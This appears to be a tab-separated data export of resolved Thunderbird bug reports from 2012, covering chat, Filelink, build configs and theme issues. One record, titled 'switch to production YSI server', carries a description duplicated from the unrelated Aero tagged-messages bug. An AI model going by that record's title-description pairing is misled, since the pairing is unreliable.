748388%TAB%1335249736%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Twitter icon also shows for gtalk accounts,Protocol icon not displayed/updated in the right pane when selecting a contact%TAB%Twitter icon also shows for gtalk accounts,Protocol icon not displayed/updated in the right pane when selecting a contactIn the right sidebar, my gmail accounts also gets the twitter icon. Steps to reproduce: 1. Start with a fresh profile 2. Set up twitter 3. Set up gtalk  If there is no twitter account present it seems gtalk gets no account icon there at all.
748358%TAB%1335246135%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Change the appearance of the chat button instead of reopening the chat tab when receiving a message%TAB%Change the appearance of the chat button instead of reopening the chat tab when receiving a messageReopening the chat tab automatically is apparently too obtrusive for email users. It was suggested that we do something with the chat button instead.  I'm closing bug 740358 as I checked-in the fix that's attached there, so I'm opening this new bug to further discuss and implement this proposed additional improvement.  See comment 1 to comment 9 in bug 740358 for more details.  This patch contains the required code changes to stop reopening the chat tab automatically, and to set an attribute on the chat toolbar button when there are unread messages directed to the user (either private messages, or messages containing the user's nick).  For the chat button, the current patch sets the "checked" attribute to "true" when there are unread messages, as it's the only thing that I found that causes a difference of appearance without any theming changes. The attribute name should probably be changed ("highlight"? "unread"?) once Andreas has some CSS changes to go with this patch. (It can trivially be edited in the _updateChatButtonState method. It would also be trivial to have the number of unread messages in the attribute; if there's a way to display that inside the button and it's wanted).
748323%TAB%1335240294%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Disable the chat feature in Thunderbird 13 beta,Disable the chat feature in beta until we ship it.%TAB%Disable the chat feature in Thunderbird 13 beta,Disable the chat feature in beta until we ship it.As decided during a meeting last week, let's disable IM for Tb13beta, as we expect to make some significant improvements to the chat feature before releasing it and don't feel we would have much time to handle the additional feedback received during this beta cycle.  Attaching a trivial patch to change the default value of the pref to globally turn off IM. Please see also bug 748322 before landing this patch.
748322%TAB%1335240032%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Preffing of the chat feature doesn't disable the gloda IM integration%TAB%Preffing of the chat feature doesn't disable the gloda IM integrationI've noticed while preparing the patch to disable IM in Thunderbird 13 beta that flipping the value of the pref doesn't disable completely the integration of IM in gloda: IM results will never be displayed, but we will still create the SQLite tables for IM and attempt to index IM conversations at startup (there will likely be none).  This doesn't seem like the right behavior, as I would prefer not touching the profile at all when IM isn't enabled.  Depending on how you (Mark, David?) feel about this, we may want to land the trivial attached patch in comm-central and comm-aurora before the merge, or in comm-beta at the same time as the patch to disable IM for Tb13beta. I requested review from both of you, but I don't think this needs both, just whoever reads it first.
748215%TAB%1335208519%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%use v2 user info with YSI to get storage values%TAB%use v2 user info with YSI to get storage valueswe should use v2 of the YSI user info command in order to get storage numbers. This patch does that. I think we need to tweak the fake ysi server to return the same kind of info. I left the check for null storage in there just in case YSI does something different than I expect.  I changed the error code we check for because now it's 401, not 500, in the case of stale auth tokens.  YSI is still returning 0 for the storage used but I believe they'll fix that.
748066%TAB%1335177686%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%The attachment part of the preferences pane is very tall%TAB%The attachment part of the preferences pane is very tallCompared to the other panes, the attachment pane is very tall. Note that this is not because of the addition of Filelink, as this happens in the current stable version of Thunderbird as well, even though the content type thing is all empty.
747896%TAB%1335156476%TAB%225658%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General,Account Manager%TAB%Remove hardcoded space inserted before success.title.after (accountProvisioner.dtd)%TAB%Remove hardcoded space inserted before success.title.after (accountProvisioner.dtd)Originally reported as Aviary.pl bug 4336.  There is hardocoded space inserted before success.title.after label which is problematic when one wants to use sth like comma after login name. (affects l10n and en-US) The sentence is like this: &success.title.before;<FirstName> <LastName>&success.title.after; . The order and also the space is hardcoded. Have you left FirstName or LastName blank when you created the account? The whole string could probably be refined into one string with a placeholder for the name so that localizers can play with the position. Were this not in some jquery code I could probably do it.
747856%TAB%1335140463%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Add Win 64 bit mozconfigs and fix Mac universal mozconfigs%TAB%Add Win 64 bit mozconfigs and fix Mac universal mozconfigsNow that bug 747025 is getting in full flow, we're starting to get builders out and running.  From the nightlies we've had running so far, we need:  - Win64 bit mozconfigs (although these aren't going to be official builds yet, having some trunk ones is what we want to match with FF and aid any development work). - Adjust Mac universal mozconfigs. The issue here is that the mozilla/ sub-directory isn't available when these are needed. Therefore we need to copy across from the Firefox directory the bits we need, this also allows us to remove most of the hacks that we've needed for the different location according to topsrcdir.  In the Win64 mozconfigs, I've had to do a bit of a hack again as the vs2010-mozconfig isn't in a common directory. I'm going to file a bug on making that common (i.e. in a build/ subdir), and when we do, we can do the same in c-c.  I'll take whoever gets to the review first.
747824%TAB%1335123788%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Improve attachmentlist navigation%TAB%Improve attachmentlist navigationI noticed some bugs in the attachmentlist code when working on my Attachment Tab add-on related to margins. Specifically, adding a margin screws up navigating with the keyboard. Here's a patch to fix it, and a couple other little issues I came across.  I suppose I can write tests, but I feel like Mozmill is the wrong way to test XBL bindings... any ideas?
747800%TAB%1335099608%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Fix code causing |Warning: function xyz does not always return a value|%TAB%Fix code causing |Warning: function xyz does not always return a value|There are a bunch of spots in our code that throw |Warning: function xyz does not always return a value|. Let's fix them so as to reduce the messiness in the Error Console. This has been annoying me lately, as I've been trying to fix startup issues in an add-on, and I always have to scroll past this stuff.
747743%TAB%1335069369%TAB%171442%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Mojibake in context menus on the chat conversation%TAB%Mojibake in context menus on the chat conversationUser Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ja; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 Build ID: 20120306064154  Steps to reproduce:  1. Open chat tab. 2. Connect twitter account. 3. Right click individual tweet to show its context menu.   Actual results:  Only the menus of twitter actions (retweet, reply, follow, ... ) has mojibake. It seems that the localized UTF-8 strings are not properly handled.
747593%TAB%1334940582%TAB%440223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Attachment File Name is Hard to Read with Aero and a Dark Desktop Background%TAB%Attachment File Name is Hard to Read with Aero and a Dark Desktop BackgroundUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0 Build ID: 20120312181643  Steps to reproduce:  Under Windows, enable Aero and set the desktop background to black.  Open an email with an attachment in Thunderbird 11.0.1 running the default theme.   Actual results:  I couldn't read the attachment's file name because the text was the same color as the background.   Expected results:  I should have been able to read the text because the text should have been a different color than the background.
747415%TAB%1334904388%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Make our css more efficient.%TAB%Make our css more efficient.While showing mconley the Efficient CSS page in MDN, I thought of a quick regex we could run to find places where we qualify ID rules with tag names or classes (which is the first thing listed as inefficient).  The command I ran was: ack -ai "^[^\"\/]*[a-z0-9]#" -G "\.css" --ignore-dir=mozilla --ignore-dir=suite  The output it gave was: mail/themes/gnomestripe/editor/EditorDialog.css 162:#alignTypeSelect,label#alignLabel {  mail/themes/gnomestripe/mail/mailWindow1.css 459:tabpanels#tabpanelcontainer {  mail/themes/pinstripe/editor/EditorDialog.css 162:#alignTypeSelect,label#alignLabel {  mail/themes/qute/editor/EditorDialog.css 162:#alignTypeSelect,label#alignLabel {  mail/themes/qute/mail/mailWindow1-aero.css 264:  #messengerWindow[sizemode=normal] tabpanels#tabpanelcontainer {  mail/themes/qute/mail/mailWindow1.css 417:tabpanels#tabpanelcontainer {  These all seem like things we may want to fix, but I haven't done any digging yet.  ('ack -ai "^[^\"\/]*[a-z0-9]\..*{" -G "\.css" --ignore-dir=mozilla --ignore-dir=suite' is another interesting command we might want to run…)
747362%TAB%1334895637%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%No account selected when opening the account settings dialog while the inbox of the unified view is selected%TAB%No account selected when opening the account settings dialog while the inbox of the unified view is selectedI see this in the error console when this happens: JavaScript error: chrome://messenger/content/AccountManager.js, line 176: childrenNode.childNodes[i]._account is undefined   I was afraid this was caused by some of my changes for bug 742238 so I investigated. The problem is that when the 'Inbox' of the unified view is selected, the code opening the Account Settings… dialog wants to select a "Unified folders" account that isn't in the list, so the code looking for this account iterates through the whole list of accounts and fails on the "Outgoing Server (SMTP)" tree item that doesn't have an _account property.  The attached patch prevents the code from failing on tree items that don't have the _account property and to fall back to the first account when the requested account isn't in the list.
747328%TAB%1334883519%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Don't hard-code the update channel in the nightly mozconfigs%TAB%Don't hard-code the update channel in the nightly mozconfigsTo allow automation to do its work when we need it to, we shouldn't hard-code the update channel in the nightly mozconfigs.
747298%TAB%1334864870%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Reader UI%TAB%Find a way to introduce users to the "Followup" button for newsgroups%TAB%Find a way to introduce users to the "Followup" button for newsgroupsIn newsgroups, "reply" in the message header used to mean "followup to newsgroup", but now it means "reply to sender", since we have a dedicated "followup" button. This might confuse people who are used to hitting reply. We should do some or all of the following:  * Hide the reply button in newsgroups for one release to help users migrate * Add a tooltip on the reply button that says "Reply to the sender of this message" * Rename the reply button to "Reply to Sender"
747165%TAB%1334836530%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Chat icons not shown on Aero in small icon mode%TAB%Chat icons not shown on Aero in small icon modeWhen the toolbar is in small icons mode the icons aren't shown because the XP selectors are stronger.
746737%TAB%1334751472%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Filelink URL insertion should not move the users selection point%TAB%Filelink URL insertion should not move the users selection pointSTR:  1)  Start a Filelink upload 2)  Start typing in the compose window, and don't stop until the upload completes  What happens?  The attachment URL gets inserted, and the user's selection is moved below it.  What's expected?  The users selection should not have changed from where they were.  This is quite disruptive to the flow of email composition.  So it turns out this isn't a problem if we're in the middle of typing a line.  If, however, the last character we typed was a newline, *then* our selection was moved.  So, new STR:  1)  Start a Filelink upload 2)  Type a few characters in the compose window, and press enter to start a new line 3)  Wait for upload to complete  What happens?  The attachment URL gets inserted, and the selection is now below the inserted URL.  What's expected?  The selection should be where the user left it - on that first newline.
746725%TAB%1334749936%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Give Filelink notification toggle and spinner a bit more bottom margin%TAB%Give Filelink notification toggle and spinner a bit more bottom marginThe toggle and spinner seem to crowd in a bit with both the menulist and the management pane for a selected provider.  We might want to give the toggle / spinner more bottom margin.  I'm not sure what you mean needs more bottom margin. Is it the richlistitem with the Dropbox-/Yousendit icon? If yes, I checked with DOMi and it looks correct aligned.  The paper flyer (is it that?) of the YSI icon isn't centered on the icon. So this could give the impression of a to low positioned icon.  I'm talking about both the richlist, and the large "Dropbox" title. Both seem to be a little bit close to the offer toggle and number spinner that are above them.  It doesn't make the UI unusable or unreadable by any means - it's mostly just an aesthetic thing.  It *feels* crowded.
746590%TAB%1334730320%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Fix in-tree mozconfigs to specify correct gcc location for Firefox Automation, and add missing mozconfig files%TAB%Fix in-tree mozconfigs to specify correct gcc location for Firefox Automation, and add missing mozconfig filesIn testing moving over to the Firefox automation, we've discovered a couple of issues:  - The mozconfigs are specifying an old gcc location. We should sync up with the FF one to minimise the risk of issues.  - The Mac mozconfig has an old check to see if mozconfig.common exists, this is something that we had for 1.9.2 and we can just drop now.  - We're not specifying the REDIST_DIR in the mozconfig for the win32 nightly. Not a big issue as I think there's something that specifies it anyway, but it'll remind us to swap that file to VS 2010 when we get that far.
746554%TAB%1334724864%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Dropbox and YouSendIt preference panes need margins next to used/unused storage counts%TAB%Dropbox and YouSendIt preference panes need margins next to used/unused storage countsThe used / unused storage storage counts seem pretty crammed together with their labels.  Seems to be true on each platform.  We should space those out.
746320%TAB%1334663256%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Disable what's new page for Thunderbird 12,Redirect what's new page for Thunderbird 12%TAB%Disable what's new page for Thunderbird 12,Redirect what's new page for Thunderbird 12There's no major features added in TB 12, so we're going to not present the What's new page. As discussed in the driver's meeting, we'll just redirect the What's New option to the release notes.  (in future we'll probably be able to do this via aus,
746309%TAB%1334662292%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Filelink uploads started from the offer notification bar has broken interaction%TAB%Filelink uploads started from the offer notification bar has broken interactionSTR:  1)  Open a compose window, attach some files 2)  Choose to link the files, and create a new Filelink account with some provider  What happens?  The upload begins, but no notification bar comes up to tell us that links will be inserted into the body of the message.  What's more, the offer notification comes back up again.  What's expected?  The opposite of the above.
746307%TAB%1334661912%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%FileLink prefs gets a empty space on the right if Lightning is installed%TAB%FileLink prefs gets a empty space on the right if Lightning is installedActually, the way it seem to work, it gains a extra space if any extension that grows the preferences pane width in any way (like adding a new icon on the top) gets installed.  The fix seems to be to not specify the width of #provider-management
746294%TAB%1334660595%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Tagged message headers in thread pane are really hard to read in Windows 7 Aero Glass.%TAB%Tagged message headers in thread pane are really hard to read in Windows 7 Aero Glass.STR:  1)  In Windows 7, with the Aero Glass theme, tag some messages in the thread pane.  Use any tags that you'd like.  It doesn't matter. 2)  Control select those messages to focus them, then use Ctrl-up/down cursor to select individual messages in the selection.  What happens?  The tagged message in the thread pane are *really* hard to read.  See screenshot.  What's expected?  Readability.
746138%TAB%1334639671%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%switch to production YSI server%TAB%switch to production YSI serverSTR:  1)  In Windows 7, with the Aero Glass theme, tag some messages in the thread pane.  Use any tags that you'd like.  It doesn't matter. 2)  Control select those messages to focus them, then use Ctrl-up/down cursor to select individual messages in the selection.  What happens?  The tagged message in the thread pane are *really* hard to read.  See screenshot.  What's expected?  Readability.
746037%TAB%1334595818%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Message tab has 1px margin on the left%TAB%Message tab has 1px margin on the leftIt should be fairly easy to spot this issue if you know where to look for: try opening a message in a tab and look at the border at the bottom of the message headers. It doesn't go all the way to the left edge.  I think this is my fault, specifically in this change: http://hg.mozilla.org/comm-central/diff/96ec61738c96/mail/themes/qute/mail/mailWindow1-aero.css  Paenglab, maybe you know what's going on with this, or have some idea of how to fix it?
746014%TAB%1334588847%TAB%75935%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mozmill,Testing Infrastructure%TAB%Some mozmill tests aren't being run currently%TAB%Some mozmill tests aren't being run currentlyWhile creating the follow-up patch for bug 332151, I noticed that there are other directories in the mozmill testsuite which aren't currently being run since they are not included in mozmilltests.list. I've confirmed looking at a log that indeed they aren't being run. I'm assuming that's not on purpose.
745950%TAB%1334578947%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%autoconfig user name probing fails if there is a cert error,autoconfig user name probing fails%TAB%autoconfig user name probing fails if there is a cert error,autoconfig user name probing failsMy isp has a domain name mismatch on certs, which causes a cert exception during account creation. Even if I override the exception, the account is created with the wrong user name (my usernames are the full e-mail addresses; autoconfig guesses that it's just the left size of the e-mail address). So I end up with an account created that doesn't work. This worked fine in 3.1 BenB was suggesting that this might have been an intentional change, but I suspect that's because I didn't describe the bug sufficiently well
745395%TAB%1334335869%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Replying to attached emails doesn't show the original message%TAB%Replying to attached emails doesn't show the original messageWorks: 12/30/2011, broken: 12/31/2011.  If you open an attached message and try to reply to it, it shows the prelude "On x/y/z, Bob said", but doesn't actually quote the original message. Not sure what happened here.
745188%TAB%1334295249%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Remove erroneous language parameters to XHTML headers%TAB%Remove erroneous language parameters to XHTML headersWe accidentally slipped some "en" locale settings into the XHTML files being shipped for Filelink (thanks to Magnus to catching that).
744923%TAB%1334230037%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Better wording in the Filelink add account dialog%TAB%Better wording in the Filelink add account dialogFrom a bwinton review in bug 739279:  Saying "This feature allows you to…" sounds off.  We don't really talk about our features by calling them "this feature" in Thunderbird anywhere else.  I would prefer something like "You can send large attachments using one of several online storage services.  Please either connect to an existing account, or sign up for a new account."
744037%TAB%1334042621%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window,FileLink%TAB%Add UbuntuOne support for Filelink%TAB%Add UbuntuOne support for FilelinkWe're aiming to support UbuntuOne with the Filelink feature. This fixes a bit rot issue with the previous patch, and makes uploading files that we don't know the mime type of work (it was failing because the code wasn't catching the exception, so I've fixed that). I've also fixed the offline error to use throw.  With those changes, I was able to sign up for a UbuntuOne account and send a filelink, so the basics seem to work.
744010%TAB%1334037875%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%YouSendIt management pane does not display used or remaining storage%TAB%YouSendIt management pane does not display used or remaining storageThe Dropbox management pane shows us a nice graphic for how much space is used, and how much is remaining.  YouSendIt's, on the other hand, is quite empty.  I do know that YSI does not currently give us any information on how much space the user has remaining - we only get how much they've used.  If I recall, this is what prevented us from using the graph.  If YSI doesn't deliver the information we need in time, we should just display to the user how much space they've used.  I have that completely backwards:  What we DO have: - How much space the user has remaining (it's the account.availableStorage value passed back when getting user information)  What we DON'T have: - How much space the user has been allocated to begin with.
744004%TAB%1334037011%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%filelink doesn't handle being offline correctly.%TAB%filelink doesn't handle being offline correctly.The providers return an error code that says we're offline, when the compose window code tries to do an upload, but the compose window code expects to get the error in the onStopRequest call. I think the compose window code should expect the error right away.  yikes, that compose attach code doesn't want to work that way. Maybe I will go the onStopRequest route, or just check if we're offline in the compose code and not allow filelink while offline.  I've decided to hide the filelink ui while offline because we don't have a string for telling the user that they can't do a filelink because we're offline. And I suspect this is probably a better experience anyway (but asking for UI review anyway).  I've also fixed the handling of the offline state in the providers and the nsMsgComposeCommands.js code for correctness sake, but if the ui is enabled while offline, we get the generic "an error occurred", which is not a nice experience.
743235%TAB%1333692423%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Search emails and IM conversations at once with gloda%TAB%Search emails and IM conversations at once with glodaThe current search from the chat tab shows only IM conversation results, and searching from another tab shows only email results. As we aren't very satisfied of this behavior, I'm trying to make the search global and the same in these tabs.  Andrew explained to me that gloda collections can't contain results of mixed types, so the only solution seems to be to merge the results just before they are displayed. The patch I'm attaching is still a work-in-progress, but it seems to work.  I would like some feedback on the WIP patch I currently have before pushing this further. The next steps are: - remove the existing IM-specific search (trivial; just some cleanup) - attempt to add some filters. I think a "Source" filter would be nice, with the network that messages are coming from ("Twitter", "IRC", "email", ...). Not sure yet how difficult that would be.
743181%TAB%1333668138%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Filelink account summary shows wrong calculation for total & free space%TAB%Filelink account summary shows wrong calculation for total & free spaceUsing my Dropbox free account, Thunderbird reports a total of 3.8GB storage space, of which 2.8GB is free space. In reality, as Dropbox account settings shows, my account has 2.8GB of total storage, of which 1.9GB is free. See attached screenshots of TB account settings (top) and Dropbox web account settings (bottom)
742793%TAB%1333615139%TAB%439193%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Avatar changes are only visible at restart,Support vCard based avatars on JS-XMPP%TAB%Avatar changes are only visible at restart,Support vCard based avatars on JS-XMPPUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50  Steps to reproduce:  My friend didn't have his avatar listed (although he had one in Adium [not through my AB] but not one in Gmail). I told this to him, he changed avatar.    Actual results:  The avatar didn't change; after logging in and out it did   Expected results:  Changes should've been reflected at runtime
742725%TAB%1333605382%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Filelink offer reappears after converting a large file back to a regular attachment%TAB%Filelink offer reappears after converting a large file back to a regular attachmentSTR:  1)  Attach a large file in a compose window, causing the Filelink offer to appear 2)  Convert the file to a Filelink 3)  Convert the file back to a regular attachment  What happens?  The Filelink offer reappears.  What's expected?  Since I already know about Filelink, already used it, and decided not to, I really shouldn't hear about it again.
742677%TAB%1333591315%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IRC members list not sorted alphabetically%TAB%IRC members list not sorted alphabeticallyThunderbird Daily 2012-04-04, Windows XP SP 3 32-bit  The list of members of an IRC channel is not sorted alphabetically, see attached screenshot.
742674%TAB%1333590133%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Instant messenger status window dimensions (width and height) too small, text gets cropped%TAB%Instant messenger status window dimensions (width and height) too small, text gets croppedThunderbird daily 2012-04-04, Windows XP SP 3 32-bit  The dimensions (width & height) of the instant messenger status window are too small. Directly after creating an IRC connection and joining it, "Connected for about 1 minute" will get cropped to "Connected for about 1 minute"
742673%TAB%1333589851%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Unable to connect to newly created IRC account after creation if Thunderbird was offline on startup,Chat accounts are not connected automatically if Thunderbird was offline on startup%TAB%Unable to connect to newly created IRC account after creation if Thunderbird was offline on startup,Chat accounts are not connected automatically if Thunderbird was offline on startupThunderbird Daily 2012-04-04, Windows XP SP 3 32-bit  I am unable to connect to a newly created IRC account after creating it in a profile in which Thunderbird was offline on startup. Thunderbird tries to connect but fails despite being online. There is a notification: "Automatic Connection Settings have been ignored because the application was started in offline mode." The "Connect" button of the account is greyed out, you have to click the "Conncet now" of the notification to get connected.
742669%TAB%1333588941%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%After closing direct chat with IRC member and IRC channel gets focus, participants list not shown, still previous conversation in use,JS error after closing a selected IM conversation, breaking some parts of the Chat UI%TAB%After closing direct chat with IRC member and IRC channel gets focus, participants list not shown, still previous conversation in use,JS error after closing a selected IM conversation, breaking some parts of the Chat UIThunderbird Daily 2012-04-04, Windows XP SP 3 32-bit  After opening a chat with an IRC member by double-clicking his name and then moving the mouse over his name in the left sidebar and closing this chat, the IRC channel again gets focus, but the right column still shows "previous conversations" and not the lists of members of the IRC channel.  In this case it seems only the top of the right pane (the conversation name and the channel topic) get updated. I'll need to investigate why this happens when closing a conversation (and the selection is moved automatically to the previous item in the list of conversations) and not when the user moves the selection.
742662%TAB%1333587362%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Can't add Search Engines with http referenced images in the xml,Can't add Search Engines with http referenced images in the xml and support adding/removing engines%TAB%Can't add Search Engines with http referenced images in the xml,Can't add Search Engines with http referenced images in the xml and support adding/removing enginesIn a search xml file, if we put <image>http://[url to an icon]</image>, then Thunderbird won't load it, and generally it breaks the UI. The comment on the error console complains that engine.iconURI is undefined.  Irving, can you take a look at this?  Here's roughly what to do.  - http://hg.mozilla.org/comm-central/annotate/d3f4108df62e/mail/base/content/webSearchTab.js#l119 is where it is failing initially, that needs a check for engine.iconURI being null.  - We'll then need a listener function to listen for search engine updates and tear down and rebuild the list, similar to:  http://hg.mozilla.org/mozilla-central/annotate/d698e656b1e0/browser/components/search/content/search.xml#l202  In doing that listener, we should basically make any of the add/remove/change rebuild the list, and by adding the facility for add/remove, will help us complete the code a bit more.  A tear down/rebuild is enough on its own, as this isn't going to be a frequent operation (typically just when a user installs an engine or clears a cache maybe).
742644%TAB%1333578309%TAB%235025%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%IRC / Chat Account Wizard / Select Server textfield displays "and server" text in Username field if it is empty,IRC's username empty text ("and server") in the Chat Account Wizard is confusing%TAB%IRC / Chat Account Wizard / Select Server textfield displays "and server" text in Username field if it is empty,IRC's username empty text ("and server") in the Chat Account Wizard is confusingUser Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20120327 Firefox/13.0a2 Build ID: 20120327115436  Steps to reproduce:  Creating IRC connect, I am on username page   Actual results:  When I selected Server textfield while Username is empty, Username field shows grey "and server" text.   Expected results:  Probably we should no do anything or write "Enter username here" or something similar.
742638%TAB%1333576537%TAB%235025%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Part and Quit messages get recoded however the character set is UTF-8%TAB%Part and Quit messages get recoded however the character set is UTF-8User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20120327 Firefox/13.0a2 Build ID: 20120327115436  Steps to reproduce:  Set ÁRVÍZTŰRŐTÜKÖRFÚRÓGÉP as Part or Quit messages in IRC client   Actual results:  I got this after save and repoen: ÃRVÃZTÅ°RÅTÃKÃRFÃRÃGÃP   Expected results:  I should remain as ÁRVÍZTŰRŐTÜKÖRFÚRÓGÉP  Kami Reporter
742538%TAB%1333542779%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Removing Filelink's from message body causes subsequent Filelink insertions to fail%TAB%Removing Filelink's from message body causes subsequent Filelink insertions to failSTR:  1)  In either HTML or Plaintext, create a Filelink 2)  Remove the Filelink from the message body 3)  Create another Filelink  What happens?  No Filelink gets inserted into the message body.  What's expected?  If the root/list nodes are not found in the message body, we should re-insert them.
742524%TAB%1333540461%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences,FileLink%TAB%Expose mail.compose.big_attachments.insertNotification in the preferences dialog%TAB%Expose mail.compose.big_attachments.insertNotification in the preferences dialogmail.compose.big_attachments.insertNotification controls whether or not we display a URL insertion notification once uploads begin.  This defaults to true.  We should allow users to pref it off in the Preferences dialog.
742469%TAB%1333533584%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Warning: Expected color but found 'none'.%TAB%Warning: Expected color but found 'none'.In Error console following is written:  Warning: Expected color but found 'none'.  Error in parsing value for 'background-color'.  Declaration dropped. Source file: chrome://messenger/skin/chat.css Line: 674
742459%TAB%1333532404%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Converting between storage service providers does not remove the old attachment URL%TAB%Converting between storage service providers does not remove the old attachment URLSTR (affects both plaintext and HTML mail):  1)  Compose a new mail, and attach a Filelink for Dropbox 2)  Convert the Filelink to use YouSendIt instead  What happens?  The old Filelink URL remains in the body of the message.  When the conversion completes, the new URL is appended, and the old one still persists.  What should happen?  When converting, the old attachment URL should go away permanently.
742250%TAB%1333503831%TAB%259000%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Conversation items should be selectable without the mouse%TAB%Conversation items should be selectable without the mouseAll IM/IRC clients allow to switch conversations with a keyboard shortcut. Thunderbird does not, I see that as an accessibility issue (and a major PITA for most users).  All IM/IRC clients also allow to reorder conversations, precisely to ease the keyboard selection.  I can suggest these keyboard shortcuts:  * accel + up/down = select previous/next conversation  * accel + shift + up/down = move current conversation up/down
742238%TAB%1333498211%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Unified view loses some folders and does not allow reset%TAB%Unified view loses some folders and does not allow resetI updated this morning to Daily. In the unified view, some folders in the Inbox virtual folder disappear (Inbox & Sent IMAP folders).  They are indeed disabled from the list of selected folders (rclick on Inbox/properties/choose). When I try to re-enable them (check & click OK), the following error appears in the console: Error: 'JavaScript component does not have a method named: "setInVFEditSearchScope"' when calling method: [nsIMsgFolder::setInVFEditSearchScope] = NS_ERROR_XPC_JSOBJECT_HAS_NO_FUNCTION_NAMED Source file: chrome://messenger/content/virtualFolderListDialog.js Line: 90
742235%TAB%1333496093%TAB%259000%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Instant Messaging UI does not fit in small screens%TAB%Instant Messaging UI does not fit in small screensTesting the daily Thunderbird on Linux.  The Instant Messaging UI shows nice-looking conversation bubbles with a lot of padding and margin. I can only see 6 lines of IRC conversation with the default settings, which makes the whole IM feature completely unusable.  Choosing a smaller font-size doesn’t help at all, the bubbles height remain the same — see attached screenshot.  I agree that there's a lot of wasted space, and the screen used for that screenshot isn't even that small.  Another issue I see on your screenshot is the color of the text at the top of the right pane; it's unreadable.  CC'ing Andreas who worked on the Thunderbird message theme.
